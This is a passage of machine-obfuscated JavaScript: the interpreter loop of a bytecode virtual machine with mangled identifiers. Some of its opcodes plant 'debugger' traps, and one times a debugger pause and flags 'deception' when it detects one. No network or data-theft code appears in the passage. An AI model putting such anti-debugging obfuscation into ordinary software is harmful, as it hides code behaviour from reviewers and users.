TypeError('Cannot\x20write\x20private\x20member\x20'+Nr+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x96:{yO:{let NW=ja[--jn],Nu=jJ[CZ],NO=A(),Nz='get_'+Nu,No=NO['get'](Nz);if(No&&No['has'](NW)){let NX=No['get'](NW);ja[jn++]=NX['call'](NW),jw++;break yO;}let Nt='_$XyWOr0'+'get_'+Nu['substring'](0x1)+'_$5OGgh7';if(NW['constructor']&&Nt in NW['constructor']){let NL=NW['constructor'][Nt];ja[jn++]=NL['call'](NW),jw++;break yO;}let Nk=NO['get'](Nu);if(Nk&&Nk['has'](NW)){ja[jn++]=Nk['get'](NW),jw++;break yO;}let NT=q(Nu);if(NT in NW){ja[jn++]=NW[NT],jw++;break yO;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+Nu+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x84:{yz:{let NR=ja[--jn];ja[jn++]=v(NR),jw++;}break;}}},Ci=function(Cb,CZ){switch(Cb){case 0xfe:{lG:{let CG=CZ&0xffff,Cv=CZ>>>0x10;ja[jn++]=jq[CG]*jJ[Cv],jw++;}break;}case 0x100:{lv:{let CS=CZ&0xffff,CD=CZ>>>0x10;ja[jn++]=jq[CS]<jJ[CD],jw++;}break;}case 0xd8:{lS:{let CB=jJ[CZ],CF=ja[--jn],CK=CE['_$pS9Iwn'],CQ=![];while(CK){if(CK['_$Ejew7m']&&CB in CK['_$Ejew7m']){if(CK['_$f84dGi']&&CB in CK['_$f84dGi'])break;CK['_$Ejew7m'][CB]=CF;!CK['_$f84dGi']&&(CK['_$f84dGi']=vmY(null));CK['_$f84dGi'][CB]=!![],CQ=!![];break;}CK=CK['_$xQCdVF'];}!CQ&&(Q(CE['_$pS9Iwn'],CB),!CE['_$pS9Iwn']['_$Ejew7m']&&(CE['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CE['_$pS9Iwn']['_$Ejew7m'][CB]=CF,!CE['_$pS9Iwn']['_$f84dGi']&&(CE['_$pS9Iwn']['_$f84dGi']=vmY(null)),CE['_$pS9Iwn']['_$f84dGi'][CB]=!![]),jw++;}break;}case 0xca:{lD:{return Cl=jn>0x0?ja[--jn]:undefined,0x1;}break;}case 0x103:{lB:{jq[CZ]=ja[--jn],jw++;}break;}case 0xdc:{lF:{let Cr=ja[--jn],CA=jJ[CZ];if(CE['_$PrfoPg']&&!(CA in vmd)&&!(CA in vmg_8e0e94))throw new ReferenceError(CA+'\x20is\x20not\x20defined');vmg_8e0e94[CA]=Cr,vmd[CA]=Cr,ja[jn++]=Cr,jw++;}break;}case 0xdb:{lK:{let Ca=jJ[CZ],Cn=ja[--jn],Cq=CE['_$pS9Iwn']['_$xQCdVF'];Cq&&(!Cq['_$Ejew7m']&&(Cq['_$Ejew7m']=vmY(null)),Cq['_$Ejew7m'][Ca]=Cn),jw++;}break;}case 0x105:{lQ:{let Cw=jq[CZ]-0x1;jq[CZ]=Cw,ja[jn++]=Cw,jw++;}break;}case 0xff:{lr:{let CJ=CZ&0xffff,Cs=CZ>>>0x10,CI=jq[CJ],CW=jJ[Cs];ja[jn++]=CI[CW],jw++;}break;}case 0xda:{lA:{let Cu=jJ[CZ];!CE['_$pS9Iwn']['_$n9ZZux']&&(CE['_$pS9Iwn']['_$n9ZZux']=vmY(null)),CE['_$pS9Iwn']['_$n9ZZux'][Cu]=!![],jw++;}break;}case 0xd7:{la:{let CO=jJ[CZ],Cz=ja[--jn];K(CE['_$pS9Iwn'],CO),!CE['_$pS9Iwn']['_$Ejew7m']&&(CE['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CE['_$pS9Iwn']['_$Ejew7m'][CO]=Cz,jw++;}break;}case 0xd3:{ln:{let Co=jJ[CZ];if(Co==='__this__'){let CR=CE['_$pS9Iwn'];while(CR){if(CR['_$n9ZZux']&&'__this__'in CR['_$n9ZZux'])throw new ReferenceError('Cannot\x20access\x20\x27__this__\x27\x20before\x20initialization');if(CR['_$Ejew7m']&&'__this__'in CR['_$Ejew7m'])break;CR=CR['_$xQCdVF'];}ja[jn++]=jA,jw++;break ln;}let Ct=CE['_$pS9Iwn'],Ck,CT=![],CX=Co['indexOf']('$$'),CL=CX!==-0x1?Co['substring'](0x0,CX):null;while(Ct){let Cm=Ct['_$n9ZZux'],CV=Ct['_$Ejew7m'];if(Cm&&Co in Cm)throw new ReferenceError('Cannot\x20access\x20\x27'+Co+'\x27\x20before\x20initialization');if(CL&&Cm&&CL in Cm){if(!(CV&&Co in CV))throw new ReferenceError('Cannot\x20access\x20\x27'+CL+'\x27\x20before\x20initialization');}if(CV&&Co in CV){Ck=CV[Co],CT=!![];break;}Ct=Ct['_$xQCdVF'];}!CT&&(Co in vmg_8e0e94?Ck=vmg_8e0e94[Co]:Ck=vmd[Co]),ja[jn++]=Ck,jw++;}break;}case 0x101:{lq:{let CH=CZ&0xffff,CP=CZ>>>0x10;jq[CH]<jJ[CP]?jw=jI[jw]:jw++;}break;}case 0xfc:{lw:{let Ce=CZ&0xffff,Ch=CZ>>>0x10;ja[jn++]=jq[Ce]+jJ[Ch],jw++;}break;}case 0xdd:{lJ:{let Cc=CZ&0xffff,Cp=CZ>>>0x10,l0=jJ[Cc],l1=CE['_$pS9Iwn'];for(let l4=0x0;l4<Cp;l4++){l1=l1['_$xQCdVF'];}let l2=l1['_$n9ZZux'];if(l2&&l0 in l2)throw new ReferenceError('Cannot\x20access\x20\x27'+l0+'\x27\x20before\x20initialization');let l3=l1['_$Ejew7m'];ja[jn++]=l3?l3[l0]:undefined,jw++;}break;}case 0xfd:{ls:{let l5=CZ&0xffff,l6=CZ>>>0x10;ja[jn++]=jq[l5]-jJ[l6],jw++;}break;}case 0x10e:{lI:{debugger;jw++;}break;}case 0xfa:{lW:{jq[CZ]=jq[CZ]+0x1,jw++;}break;}case 0xc9:{lu:{jw++;}break;}case 0xd9:{lO:{let l7=jJ[CZ],l8=ja[--jn];K(CE['_$pS9Iwn'],l7);if(!CE['_$pS9Iwn']['_$Ejew7m'])CE['_$pS9Iwn']['_$Ejew7m']=vmY(null);CE['_$pS9Iwn']['_$Ejew7m'][l7]=l8,!CE['_$pS9Iwn']['_$f84dGi']&&(CE['_$pS9Iwn']['_$f84dGi']=vmY(null)),CE['_$pS9Iwn']['_$f84dGi'][l7]=!![],jw++;}break;}case 0x10f:{lz:{if(typeof process!=='undefined'&&process['hrtime']&&process['hrtime']['bigint']){var CY=process['hrtime']['bigint']();debugger;if(Number(process['hrtime']['bigint']()-CY)/0xf4240>0.1)try{_setDeceptionDetected();}catch(l9){}}jw++;}break;}case 0x104:{lo:{let lj=jq[CZ]+0x1;jq[CZ]=lj,ja[jn++]=lj,jw++;}break;}case 0xd4:{lt:{let lC=jJ[CZ],ll=ja[--jn],lE=CE['_$pS9Iwn'],lN=![];while(lE){let ly=lE['_$n9ZZux'],lx=lE['_$Ejew7m'];if(ly&&lC in ly)throw new ReferenceError('Cannot\x20access\x20\x27'+lC+'\x27\x20before\x20initialization');if(lx&&lC in lx){if(lE['_$j23EpX']&&lC in lE['_$j23EpX']){if(CE['_$PrfoPg'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');lN=!![];break;}if(lE['_$f84dGi']&&lC in lE['_$f84dGi'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');lx[lC]=ll,lN=!![];break;}lE=lE['_$xQCdVF'];}if(!lN){if(lC in vmg_8e0e94)vmg_8e0e94[lC]=ll;else lC in vmd?vmd[lC]=ll:vmd[lC]=ll;}jw++;}break;}case 0xfb:{lk:{jq[CZ]=jq[CZ]-0x1,jw++;}break;}case 0xd5:{lT:{ja[jn++]=CE['_$pS9Iwn'],jw++;}break;}case 0xd2:{lX:{let li=ja[--jn],lg={['_$Ejew7m']:null,['_$f84dGi']:null,['_$n9ZZux']:null,['_$xQCdVF']:li};CE['_$pS9Iwn']=lg,jw++;}break;}case 0x102:{lL:{let lf=CZ&0xffff,lU=CZ>>>0x10,ld=ja[--jn],lM=G(C2,ld),lb=jq[lf],lZ=jJ[lU],lY=lb[lZ];ja[jn++]=lY['apply'](lb,lM),jw++;}break;}case 0xc8:{lR:{debugger;jw++;}break;}case 0xd6:{lm:{CE['_$pS9Iwn']&&CE['_$pS9Iwn']['_$xQCdVF']&&(CE['_$pS9Iwn']=CE['_$pS9Iwn']['_$xQCdVF']),jw++;}break;}}});switch(Cd){case 0xb:{let Cb=ja[--jn],CZ=ja[--jn];ja[jn++]=CZ-Cb,jw++;continue;}case 0x7:{jq[CM]=ja[--jn],jw++;continue;}case 0x48:{let CY=ja[--jn],CG=ja[--jn];if(CG===null||CG===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(CY)+'\x27\x20of\x20'+CG);ja[jn++]=CG[CY],jw++;continue;}case 0x3:{ja[--jn],jw++;continue;}case 0x34:{!ja[--jn]?jw=jI[jw]:jw++;continue;}case 0xa:{let Cv=ja[--jn],CS=ja[--jn];ja[jn++]=CS+Cv,jw++;continue;}case 0x2c:{let CD=ja[--jn],CB=ja[--jn];ja[jn++]=CB<CD,jw++;continue;}case 0x10:{let CF=ja[--jn];ja[jn++]=typeof CF===f?CF+0x1n:+CF+0x1,jw++;continue;}case 0x0:{ja[jn++]=jJ[CM],jw++;continue;}case 0x49:{let CK=ja[--jn],CQ=ja[--jn],Cr=ja[--jn];if(Cr===null||Cr===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(CQ)+'\x27\x20of\x20'+Cr);if(jP){if(!Reflect['set'](Cr,CQ,CK))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(CQ)+'\x27\x20of\x20object');}else Cr[CQ]=CK;ja[jn++]=CK,jw++;continue;}case 0x4:{let CA=ja[jn-0x1];ja[jn++]=CA,jw++;continue;}case 0x8:{ja[jn++]=jF[CM],jw++;continue;}case 0x32:{jw=jI[jw];continue;}case 0x1c:{let Ca=ja[--jn];ja[jn++]=typeof Ca===f?Ca:+Ca,jw++;continue;}case 0x6:{ja[jn++]=jq[CM],jw++;continue;}case 0x2e:{let Cn=ja[--jn],Cq=ja[--jn];ja[jn++]=Cq>Cn,jw++;continue;}case 0x1:{ja[jn++]=undefined,jw++;continue;}}CE=CC;if(Cd<0x5a){if(Cy(Cd,CM)){if(Cj>0x0){CN();continue;}return Cl;}}else{if(Cd<0xc8){if(Cx(Cd,CM)){if(Cj>0x0){CN();continue;}return Cl;}}else{if(Ci(Cd,CM)){if(Cj>0x0){CN();continue;}return Cl;}}}C4=CC['_$pS9Iwn'],C7=CC['_$EnCqdU'];}break;}catch(Cw){if(jk&&jk['length']>0x0){let CJ=jk[jk['length']-0x1];jn=CJ['_$zoO9Bb'];if(CJ['_$CDWarX']!==undefined)C1(Cw),jw=CJ['_$CDWarX'],CJ['_$CDWarX']=undefined,CJ['_$9BLmcO']===undefined&&jk['pop']();else CJ['_$9BLmcO']!==undefined?(jw=CJ['_$9BLmcO'],CJ['_$XEwkUm']=Cw):(jw=CJ['_$iPzJWv'],jk['pop']());continue;}throw Cw;}}return jn>0x0?ja[--jn]:C7?jA:undefined;}function t(jB,jF,jK,jQ,jr,jA){let ja=new Array(0x8),jn=0x0,jq=new Array((jB[0x12]||0x0)+(jB[0x11]||0x0)),jw=0x0,jJ=jB[0x15],js=jB[0x13],jI=jB[0x10]||U,jW=jB[0x16]||U,ju=js['length']>>0x1,jO=(jB[0x12]*0x1f^jB[0x11]*0x11^ju*0xd^jJ['length']*0x7)>>>0x0&0x3,jz,jo,jt;switch(jO){case 0x1:jz=0x1,jo=0x0,jt=0x1;break;case 0x2:jz=0x0,jo=ju,jt=0x0;break;case 0x3:jz=ju,jo=0x0,jt=0x0;break;default:jz=0x0,jo=0x1,jt=0x1;break;}let jk=null,jT=null,jX=![],jL=undefined,jR=![],jm=0x0,jV=![],jH=0x0,jP=!!jB[0x6],je=!!jB[0x2],jh=!!jB[0x5],jc=!!jB[0xf],jp=jA,C0=!!jB[0xc];!jP&&!C0&&(jA===undefined||jA===null)&&(jA=vmd);let C1=jB[0x7],C2,C3,C4,C5,C6,C7;if(C1!==undefined){let Cg=Cf=>typeof Cf==='number'&&(Cf|0x0)===Cf&&!Object['is'](Cf,-0x0)?Cf^C1|0x0:Cf;C2=Cf=>{ja[jn++]=Cg(Cf);},C3=()=>Cg(ja[--jn]),C4=()=>Cg(ja[jn-0x1]),C5=Cf=>{ja[jn-0x1]=Cg(Cf);},C6=Cf=>Cg(ja[jn-Cf]),C7=(Cf,CU)=>{ja[jn-Cf]=Cg(CU);};}else C2=Cf=>{ja[jn++]=Cf;},C3=()=>ja[--jn],C4=()=>ja[jn-0x1],C5=Cf=>{ja[jn-0x1]=Cf;},C6=Cf=>ja[jn-Cf],C7=(Cf,CU)=>{ja[jn-Cf]=CU;};let C8=Cf=>Cf,C9={['_$Ejew7m']:null,['_$f84dGi']:null,['_$n9ZZux']:null,['_$xQCdVF']:jK};if(jF){let Cf=jB[0x12]||0x0;for(let CU=0x0,Cd=jF['length']<Cf?jF['length']:Cf;CU<Cd;CU++){jq[CU]=jF[CU];}}let Cj=(jP||!je)&&jF?S(jF):null,CC=null,Cl=![],CE=jq['length'],CN=null,Cy=0x0;jc&&(C9['_$n9ZZux']=vmY(null),C9['_$n9ZZux']['__this__']=!![]);n(jB,C9,jQ);let Cx={['_$PrfoPg']:jP,['_$ljpiDP']:je,['_$RGOBBT']:jh,['_$gGmnny']:jc,['_$EnCqdU']:Cl,['_$7e7bv7']:jp,['_$GeMxwg']:Cj,['_$pS9Iwn']:C9};function Ci(CM,Cb){if(CM===0x1)C2(Cb);else{if(CM===0x2){if(jk&&jk['length']>0x0){let CB=jk[jk['length']-0x1];jn=CB['_$zoO9Bb'];if(CB['_$CDWarX']!==undefined){C2(Cb),jw=CB['_$CDWarX'],CB['_$CDWarX']=undefined;if(CB['_$9BLmcO']===undefined)jk['pop']();}else CB['_$9BLmcO']!==undefined?(jw=CB['_$9BLmcO'],CB['_$XEwkUm']=Cb):(jw=CB['_$iPzJWv'],jk['pop']());}else throw Cb;}else{if(CM===0x3){let CF=Cb;if(jk&&jk['length']>0x0){let CK=jk[jk['length']-0x1];if(CK['_$9BLmcO']!==undefined)jX=!![],jL=CF,jw=CK['_$9BLmcO'];else return CF;}else return CF;}}}while(jw<ju){try{while(jw<ju){let CQ=js[jz+(jw<<jt)],Cr=js[jo+(jw<<jt)];if(CQ===g){let CA=C3();return jw++,{['_$TRB1xK']:l,['_$kc4PA6']:CA,'_d':Ci};}if(CQ===x){let Ca=C3();return jw++,{['_$TRB1xK']:E,['_$kc4PA6']:Ca,'_d':Ci};}if(CQ===i){let Cn=C3();return jw++,{['_$TRB1xK']:N,['_$kc4PA6']:Cn,'_d':Ci};}var CZ,CY,CG,Cv,CS,CD;!Cv&&(CY=null,CG=function(){for(let Cq=CE-0x1;Cq>=0x0;Cq--){jq[Cq]=CN[--Cy];}C9=CN[--Cy],Cx['_$pS9Iwn']=C9,Cj=CN[--Cy],Cx['_$GeMxwg']=Cj,CC=CN[--Cy],jF=CN[--Cy],jn=CN[--Cy],jw=CN[--Cy],ja[jn++]=CZ,jw++;},Cv=function(Cq,Cw){switch(Cq){case 0x47:{Ew:{let CJ=ja[--jn],Cs=ja[--jn],CI=jJ[Cw];if(Cs===null||Cs===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(CI)+'\x27\x20of\x20'+Cs);if(CY['_$PrfoPg']){if(!Reflect['set'](Cs,CI,CJ))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(CI)+'\x27\x20of\x20object');}else Cs[CI]=CJ;ja[jn++]=CJ,jw++;}break;}case 0xf:{EJ:{ja[jn-0x1]=-ja[jn-0x1],jw++;}break;}case 0x2f:{Es:{let CW=ja[--jn],Cu=ja[--jn];ja[jn++]=Cu>=CW,jw++;}break;}case 0x4d:{EI:{ja[jn++]={},jw++;}break;}case 0x19:{EW:{let CO=ja[--jn],Cz=ja[--jn];ja[jn++]=Cz>>CO,jw++;}break;}case 0x2c:{Eu:{let Co=ja[--jn],Ct=ja[--jn];ja[jn++]=Ct<Co,jw++;}break;}case 0x17:{EO:{ja[jn-0x1]=~ja[jn-0x1],jw++;}break;}case 0x33:{Ez:{ja[--jn]?jw=jI[jw]:jw++;}break;}case 0x2d:{Eo:{let Ck=ja[--jn],CT=ja[--jn];ja[jn++]=CT<=Ck,jw++;}break;}case 0x12:{Et:{let CX=ja[--jn],CL=ja[--jn];ja[jn++]=CL**CX,jw++;}break;}case 0x1d:{Ek:{ja[jn-0x1]=String(ja[jn-0x1]),jw++;}break;}case 0x1a:{ET:{let CR=ja[--jn],Cm=ja[--jn];ja[jn++]=Cm>>>CR,jw++;}break;}case 0x3b:{EX:{jk['pop'](),jw++;}break;}case 0xb:{EL:{let CV=ja[--jn],CH=ja[--jn];ja[jn++]=CH-CV,jw++;}break;}case 0x7:{ER:{jq[Cw]=ja[--jn],jw++;}break;}case 0x49:{Em:{let CP=ja[--jn],Ce=ja[--jn],Ch=ja[--jn];if(Ch===null||Ch===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(Ce)+'\x27\x20of\x20'+Ch);if(CY['_$PrfoPg']){if(!Reflect['set'](Ch,Ce,CP))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(Ce)+'\x27\x20of\x20object');}else Ch[Ce]=CP;ja[jn++]=CP,jw++;}break;}case 0x1b:{EV:{let Cc=ja[jn-0x3],Cp=ja[jn-0x2],l0=ja[jn-0x1];ja[jn-0x3]=Cp,ja[jn-0x2]=l0,ja[jn-0x1]=Cc,jw++;}break;}case 0x4b:{EH:{let l1=jJ[Cw],l2;if(vmg_8e0e94['_$Y9dSnQ']&&l1 in vmg_8e0e94['_$Y9dSnQ'])throw new ReferenceError('Cannot\x20access\x20\x27'+l1+'\x27\x20before\x20initialization');if(l1 in vmg_8e0e94)l2=vmg_8e0e94[l1];else{if(l1 in vmd)l2=vmd[l1];else throw new ReferenceError(l1+'\x20is\x20not\x20defined');}ja[jn++]=l2,jw++;}break;}case 0x6:{EP:{ja[jn++]=jq[Cw],jw++;}break;}case 0x1c:{Ee:{let l3=ja[--jn];ja[jn++]=typeof l3===f?l3:+l3,jw++;}break;}case 0x20:{Eh:{ja[jn-0x1]=!ja[jn-0x1],jw++;}break;}case 0x28:{Ec:{let l4=ja[--jn],l5=ja[--jn];ja[jn++]=l5==l4,jw++;}break;}case 0x35:{Ep:{let l6=ja[--jn];l6!==null&&l6!==undefined?jw=jI[jw]:jw++;}break;}case 0x3e:{N0:{if(jT!==null){jX=![],jR=![],jV=![];let l7=jT;jT=null;throw l7;}if(jX){if(jk&&jk['length']>0x0){let l9=jk[jk['length']-0x1];if(l9['_$9BLmcO']!==undefined){jw=l9['_$9BLmcO'];break N0;}}let l8=jL;return jX=![],jL=undefined,CZ=l8,0x1;}if(jR){if(jk&&jk['length']>0x0){let lC=jk[jk['length']-0x1];if(lC['_$9BLmcO']!==undefined){jw=lC['_$9BLmcO'];break N0;}}let lj=jm;jR=![],jm=0x0,jw=lj;break N0;}if(jV){if(jk&&jk['length']>0x0){let lE=jk[jk['length']-0x1];if(lE['_$9BLmcO']!==undefined){jw=lE['_$9BLmcO'];break N0;}}let ll=jH;jV=![],jH=0x0,jw=ll;break N0;}jw++;}break;}case 0x11:{N1:{let lN=ja[--jn];ja[jn++]=typeof lN===f?lN-0x1n:+lN-0x1,jw++;}break;}case 0xe:{N2:{let ly=ja[--jn],lx=ja[--jn];ja[jn++]=lx%ly,jw++;}break;}case 0x39:{N3:{throw ja[--jn];}break;}case 0x3c:{N4:{let li=ja[--jn];if(Cw!=null){let lg=jJ[Cw];!CY['_$pS9Iwn']['_$Ejew7m']&&(CY['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CY['_$pS9Iwn']['_$Ejew7m'][lg]=li;}jw++;}break;}case 0x3:{N5:{ja[--jn],jw++;}break;}case 0x3a:{N6:{let lf=jW[jw];if(!jk)jk=[];jk['push']({['_$CDWarX']:lf[0x0]>=0x0?lf[0x0]:undefined,['_$9BLmcO']:lf[0x1]>=0x0?lf[0x1]:undefined,['_$iPzJWv']:lf[0x2]>=0x0?lf[0x2]:undefined,['_$zoO9Bb']:jn}),jw++;}break;}case 0x14:{N7:{let lU=ja[--jn],ld=ja[--jn];ja[jn++]=ld&lU,jw++;}break;}case 0x48:{N8:{let lM=ja[--jn],lb=ja[--jn];if(lb===null||lb===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(lM)+'\x27\x20of\x20'+lb);ja[jn++]=lb[lM],jw++;}break;}case 0x5:{N9:{let lZ=ja[jn-0x1];ja[jn-0x1]=ja[jn-0x2],ja[jn-0x2]=lZ,jw++;}break;}case 0x18:{Nj:{let lY=ja[--jn],lG=ja[--jn];ja[jn++]=lG<<lY,jw++;}break;}case 0x36:{NC:{let lv=ja[--jn],lS=ja[--jn];if(typeof lS!=='function')throw new TypeError(lS+'\x20is\x20not\x20a\x20function');let lD=vmg_8e0e94['_$j2q9Zj'],lB=!vmg_8e0e94['_$mOUl7D']&&!vmg_8e0e94['_$iBkIOU']&&!(lD&&lD['get'](lS))&&Z['get'](lS);if(lB){let lA=lB['c']||(lB['c']=typeof lB['b']==='object'?lB['b']:jv(lB['b']));if(lA){let la;if(lv===0x0)la=[];else{if(lv===0x1){let lq=ja[--jn];la=lq&&typeof lq==='object'&&M['has'](lq)?lq['value']:[lq];}else la=G(C3,lv);}let ln=lA[0xa];if(ln&&lA===jB&&!lA[0x16]&&lB['e']===jK){!CN&&(CN=[]);CN[Cy++]=jw,CN[Cy++]=jn,CN[Cy++]=jF,CN[Cy++]=CC,CN[Cy++]=Cj,CN[Cy++]=C9;for(let lw=0x0;lw<CE;lw++){CN[Cy++]=jq[lw];}jF=la,CC=null;if(lA[0x2]){Cj=null;let lJ=lA[0x12]||0x0;for(let ls=0x0;ls<lJ&&ls<la['length'];ls++){jq[ls]=la[ls];}for(let lI=la['length']<lJ?la['length']:lJ;lI<CE;lI++){jq[lI]=undefined;}jw=ln;}else{Cj=S(la),Cx['_$GeMxwg']=Cj;for(let lW=0x0;lW<CE;lW++){jq[lW]=undefined;}jw=0x0;}break NC;}vmg_8e0e94['_$K6W8Lo']?vmg_8e0e94['_$K6W8Lo']=![]:vmg_8e0e94['_$mOUl7D']=undefined;ja[jn++]=o(lA,la,lB['e'],lS,undefined,undefined),jw++;break NC;}}let lF=vmg_8e0e94['_$mOUl7D'],lK=vmg_8e0e94['_$j2q9Zj'],lQ=lK&&lK['get'](lS);lQ?(vmg_8e0e94['_$K6W8Lo']=!![],vmg_8e0e94['_$mOUl7D']=lQ):vmg_8e0e94['_$mOUl7D']=undefined;let lr;try{if(lv===0x0)lr=lS();else{if(lv===0x1){let lu=ja[--jn];lr=lu&&typeof lu==='object'&&M['has'](lu)?vmQ(lS,undefined,lu['value']):lS(lu);}else lr=vmQ(lS,undefined,G(C3,lv));}ja[jn++]=lr;}finally{lQ&&(vmg_8e0e94['_$K6W8Lo']=![]),vmg_8e0e94['_$mOUl7D']=lF;}jw++;}break;}case 0x40:{Nl:{let lO=jI[jw];if(jk&&jk['length']>0x0){let lz=jk[jk['length']-0x1];if(lz['_$9BLmcO']!==undefined&&lO>=lz['_$iPzJWv']){jV=!![],jH=lO,jw=lz['_$9BLmcO'];break Nl;}}jw=lO;}break;}case 0x2:{NE:{ja[jn++]=null,jw++;}break;}case 0x4a:{NN:{let lo,lt;Cw!=null?(lt=ja[--jn],lo=jJ[Cw]):(lo=ja[--jn],lt=ja[--jn]);let lk=delete lt[lo];if(CY['_$PrfoPg']&&!lk)throw new TypeError('Cannot\x20delete\x20property\x20\x27'+String(lo)+'\x27\x20of\x20object');ja[jn++]=lk,jw++;}break;}case 0x53:{Ny:{let lT=ja[--jn],lX=ja[--jn],lL=jJ[Cw];vmZ(lX,lL,{'value':lT,'writable':!![],'enumerable':!![],'configurable':!![]}),typeof lT==='function'&&(!vmg_8e0e94['_$j2q9Zj']&&(vmg_8e0e94['_$j2q9Zj']=new WeakMap()),vmg_8e0e94['_$j2q9Zj']['set'](lT,lX)),jw++;}break;}case 0x16:{Nx:{let lR=ja[--jn],lm=ja[--jn];ja[jn++]=lm^lR,jw++;}break;}case 0x34:{Ni:{!ja[--jn]?jw=jI[jw]:jw++;}break;}case 0x54:{Ng:{let lV=ja[--jn],lH=ja[--jn],lP=ja[--jn];vmZ(lP,lH,{'value':lV,'writable':!![],'enumerable':!![],'configurable':!![]}),typeof lV==='function'&&(!vmg_8e0e94['_$j2q9Zj']&&(vmg_8e0e94['_$j2q9Zj']=new WeakMap()),vmg_8e0e94['_$j2q9Zj']['set'](lV,lP)),jw++;}break;}case 0x2e:{Nf:{let le=ja[--jn],lh=ja[--jn];ja[jn++]=lh>le,jw++;}break;}case 0x13:{NU:{ja[jn-0x1]=+ja[jn-0x1],jw++;}break;}case 0x9:{Nd:{jF[Cw]=ja[--jn],jw++;}break;}case 0x51:{NM:{let lc=ja[--jn],lp=ja[jn-0x1];lc!==null&&lc!==undefined&&Object['assign'](lp,lc),jw++;}break;}case 0x8:{Nb:{ja[jn++]=jF[Cw],jw++;}break;}case 0x3f:{NZ:{let E0=jI[jw];if(jk&&jk['length']>0x0){let E1=jk[jk['length']-0x1];if(E1['_$9BLmcO']!==undefined&&E0>=E1['_$iPzJWv']){jR=!![],jm=E0,jw=E1['_$9BLmcO'];break NZ;}}jw=E0;}break;}case 0x4f:{NY:{let E2=ja[--jn],E3=ja[--jn];ja[jn++]=E3 in E2,jw++;}break;}case 0x29:{NG:{let E4=ja[--jn],E5=ja[--jn];ja[jn++]=E5!=E4,jw++;}break;}case 0x0:{Nv:{ja[jn++]=jJ[Cw],jw++;}break;}case 0x4c:{NS:{let E6=ja[--jn],E7=jJ[Cw];if(vmg_8e0e94['_$Y9dSnQ']&&E7 in vmg_8e0e94['_$Y9dSnQ'])throw new ReferenceError('Cannot\x20access\x20\x27'+E7+'\x27\x20before\x20initialization');let E8=!(E7 in vmg_8e0e94)&&!(E7 in vmd);vmg_8e0e94[E7]=E6,E7 in vmd&&(vmd[E7]=E6),E8&&(vmd[E7]=E6),ja[jn++]=E6,jw++;}break;}case 0xa:{ND:{let E9=ja[--jn],Ej=ja[--jn];ja[jn++]=Ej+E9,jw++;}break;}case 0x32:{NB:{jw=jI[jw];}break;}case 0x52:{NF:{let EC=ja[--jn],El=ja[--jn];El===null||El===undefined?ja[jn++]=undefined:ja[jn++]=El[EC],jw++;}break;}case 0x4e:{NK:{let EE=ja[--jn],EN=jJ[Cw];EE===null||EE===undefined?ja[jn++]=undefined:ja[jn++]=EE[EN],jw++;}break;}case 0x4:{NQ:{let Ey=ja[jn-0x1];ja[jn++]=Ey,jw++;}break;}case 0x2a:{Nr:{let Ex=ja[--jn],Ei=ja[--jn];ja[jn++]=Ei===Ex,jw++;}break;}case 0x1:{NA:{ja[jn++]=undefined,jw++;}break;}case 0x3d:{Na:{if(jk&&jk['length']>0x0){let Eg=jk[jk['length']-0x1];Eg['_$9BLmcO']===jw&&(Eg['_$XEwkUm']!==undefined&&(jT=Eg['_$XEwkUm']),jk['pop']());}jw++;}break;}case 0x46:{Nn:{let Ef=ja[--jn],EU=jJ[Cw];if(Ef===null||Ef===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(EU)+'\x27\x20of\x20'+Ef);ja[jn++]=Ef[EU],jw++;}break;}case 0xd:{Nq:{let Ed=ja[--jn],EM=ja[--jn];ja[jn++]=EM/Ed,jw++;}break;}case 0x37:{Nw:{let Eb=ja[--jn],EZ=ja[--jn],EY=ja[--jn];if(typeof EZ!=='function')throw new TypeError(EZ+'\x20is\x20not\x20a\x20function');let EG=vmg_8e0e94['_$j2q9Zj'],Ev=EG&&EG['get'](EZ),ES=vmg_8e0e94['_$mOUl7D'];Ev&&(vmg_8e0e94['_$K6W8Lo']=!![],vmg_8e0e94['_$mOUl7D']=Ev);let ED;try{if(Eb===0x0)ED=vmQ(EZ,EY,[]);else{if(Eb===0x1){let EB=ja[--jn];ED=EB&&typeof EB==='object'&&M['has'](EB)?vmQ(EZ,EY,EB['value']):vmQ(EZ,EY,[EB]);}else ED=vmQ(EZ,EY,G(C3,Eb));}ja[jn++]=ED;}finally{Ev&&(vmg_8e0e94['_$K6W8Lo']=![],vmg_8e0e94['_$mOUl7D']=ES);}jw++;}break;}case 0x10:{NJ:{let EF=ja[--jn];ja[jn++]=typeof EF===f?EF+0x1n:+EF+0x1,jw++;}break;}case 0x15:{Ns:{let EK=ja[--jn],EQ=ja[--jn];ja[jn++]=EQ|EK,jw++;}break;}case 0x38:{NI:{if(jk&&jk['length']>0x0){let Er=jk[jk['length']-0x1];if(Er['_$9BLmcO']!==undefined){jX=!![],jL=ja[--jn],jw=Er['_$9BLmcO'];break NI;}}return jX&&(jX=![],jL=undefined),CZ=ja[--jn],0x1;}break;}case 0x2b:{NW:{let EA=ja[--jn],Ea=ja[--jn];ja[jn++]=Ea!==EA,jw++;}break;}case 0xc:{Nu:{let En=ja[--jn],Eq=ja[--jn];ja[jn++]=Eq*En,jw++;}break;}}},CS=function(Cq,Cw){switch(Cq){case 0x82:{y7:{let Cs=ja[--jn],CI=Cs['next']();ja[jn++]=Promise['resolve'](CI),jw++;}break;}case 0xa4:{y8:{ja[jn++]=jr,jw++;}break;}case 0x90:{y9:{let 